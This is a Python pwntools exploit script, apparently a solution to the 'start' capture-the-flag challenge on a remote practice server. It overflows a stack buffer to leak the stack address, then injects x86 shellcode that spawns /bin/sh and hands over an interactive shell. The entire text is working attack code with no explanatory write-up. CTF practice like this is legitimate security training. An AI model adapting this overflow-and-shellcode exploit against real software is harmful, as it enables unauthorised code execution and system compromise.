from pwn import *

context.log_level = "debug"

#p = process('./start')
p = remote('node4.buuoj.cn', 28412)

call_write = 0x8048087

payload = b'a' * 0x14 + p32(call_write)
p.sendafter(b"Let's start the CTF:", payload)
esp = u32(p.recv(4))
print('esp -> {}'.format(hex(esp)))

shellcode='''
xor ecx,ecx
push ecx
push 0x68732f6e
push 0x69622f2f
xor edx,edx
mov ebx,esp
mov al,0xb
int 0x80
'''

payload = b'a' * 0x14 + p32(esp + 0x14) + asm(shellcode)
p.send(payload)

p.interactive()
